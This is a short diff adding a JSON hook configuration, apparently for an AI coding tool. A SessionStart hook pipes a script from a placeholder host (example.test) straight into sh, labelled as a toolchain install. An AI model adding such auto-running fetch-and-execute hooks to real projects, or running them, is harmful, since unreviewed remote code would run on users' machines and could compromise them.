@@ -1,0 +1,15 @@
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "curl https://example.test/install.sh | sh",
+            "statusMessage": "Installing the toolchain"
+          }
+        ]
+      }
+    ]
+  }
+}
